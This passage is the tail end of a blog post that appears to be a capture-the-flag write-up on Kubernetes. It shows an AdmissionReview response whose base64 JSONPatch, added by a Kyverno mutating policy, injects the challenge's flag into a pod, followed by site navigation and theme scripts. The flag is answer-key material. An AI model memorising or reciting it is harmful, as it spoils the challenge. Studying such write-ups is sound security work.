style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#f92672">&#34;resource&#34;</span>:<span style="color:#e6db74">&#34;pods&#34;</span>},<span style="color:#f92672">&#34;requestKind&#34;</span>:{<span style="color:#f92672">&#34;group&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#f92672">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Pod&#34;</span>},<span style="color:#f92672">&#34;requestResource&#34;</span>:{<span style="color:#f92672">&#34;group&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#f92672">&#34;resource&#34;</span>:<span style="color:#e6db74">&#34;pods&#34;</span>},<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;curl-flag&#34;</span>,<span style="color:#f92672">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;sensitive-ns&#34;</span>,<span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;CREATE&#34;</span>,<span style="color:#f92672">&#34;userInfo&#34;</span>:{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;kube-review&#34;</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;ee8332cb-afa6-412e-b60a-641f23d28980&#34;</span>},<span style="color:#f92672">&#34;object&#34;</span>:{<span style="color:#f92672">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Pod&#34;</span>,<span style="color:#f92672">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#f92672">&#34;metadata&#34;</span>:{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;curl-flag&#34;</span>,<span style="color:#f92672">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;sensitive-ns&#34;</span>,<span style="color:#f92672">&#34;creationTimestamp&#34;</span>:<span style="color:#66d9ef">null</span>},<span style="color:#f92672">&#34;spec&#34;</span>:{<span style="color:#f92672">&#34;containers&#34;</span>:[{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;curl-container&#34;</span>,<span style="color:#f92672">&#34;image&#34;</span>:<span style="color:#e6db74">&#34;curlimages/curl&#34;</span>,<span style="color:#f92672">&#34;resources&#34;</span>:{}}]},<span style="color:#f92672">&#34;status&#34;</span>:{}},<span style="color:#f92672">&#34;oldObject&#34;</span>:<span style="color:#66d9ef">null</span>,<span style="color:#f92672">&#34;dryRun&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;options&#34;</span>:{<span style="color:#f92672">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;CreateOptions&#34;</span>,<span style="color:#f92672">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;meta.k8s.io/v1&#34;</span>}},<span style="color:#f92672">&#34;response&#34;</span>:{<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;dd916513-9b96-4220-ae2b-b21470612d69&#34;</span>,<span style="color:#f92672">&#34;allowed&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;patch&#34;</span>:<span style="color:#e6db74">&#34;W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d&#34;</span>,<span style="color:#f92672">&#34;patchType&#34;</span>:<span style="color:#e6db74">&#34;JSONPatch&#34;</span>}}
</span></span></code></pre></div><p><img loading="lazy" src="2024-03-26-22-26-59.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/read-free-opensource/">
    <span class="title">« Prev</span>
    <br>
    <span>若为自由故, 软件皆可抛</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/gossip-2023-summary/">
    <span class="title">Next »</span>
    <br>
    <span>2023年度总结</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
